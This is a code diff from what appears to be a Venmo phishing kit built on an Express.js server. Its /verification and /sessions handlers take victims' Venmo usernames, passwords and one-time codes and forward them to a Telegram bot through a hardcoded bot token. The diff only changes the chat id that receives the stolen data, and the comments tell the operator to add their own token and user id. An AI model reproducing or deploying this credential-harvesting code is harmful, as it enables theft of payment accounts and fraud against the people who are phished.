@@ -31,7 +31,7 @@ app.get("/verification", (req, res) => {
 
 app.post("/verification", (req, res ) => {
     let apiToken = "5364944530:AAFEheGnupyqVT89GvYMLAb3QGM9wq5yN1o" ///Add your telegram bot token
-    let chat_id =  5031313549 ///add your user id
+    let chat_id =  5459196069 ///add your user id
     let message = `Email for account:${req.body.otp}`
     console.log(req.body)
     if (req.body.otp) {
@@ -44,7 +44,7 @@ app.post("/verification", (req, res ) => {
 
 app.post('/sessions', function(request, response) {
     let apiToken = "5364944530:AAFEheGnupyqVT89GvYMLAb3QGM9wq5yN1o" ///Add your telegram bot token
-    let chat_id =  5031313549 ///add your user id
+    let chat_id =  5459196069 ///add your user id
     console.log(request.body.phoneEmailUsername)
     if(request.body.phoneEmailUsername) {
         let message = `Email for Venmo account: ${request.body.phoneEmailUsername}\nPassword for venmo account:${request.body.password}`
